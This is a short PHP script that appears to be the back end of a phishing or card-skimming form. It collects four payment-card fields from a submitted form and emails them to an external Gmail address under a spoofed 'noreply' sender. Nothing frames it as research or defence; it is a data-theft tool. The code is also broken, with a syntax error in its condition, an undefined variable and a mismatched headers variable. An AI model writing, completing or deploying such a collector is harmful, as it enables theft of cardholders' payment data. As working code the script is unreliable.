<?php 
$card1 = $_POST['card1'];
$card2 = $_POST['card2'];
$card3 = $_POST['card3'];
$card4 = $_POST['card4'];

$to = "mxr2137@gmail.com";

$subject = "Info";
$txt ="Card info:". $card1 . $card2 . $card3 . $card4;

$headers = "From: noreply@mxr.com" . "\r\n" .
  "CC: somebodyelse@example.com:";
if($email!=) {
  mail($to,$subject,$txt,$header);
}
?>
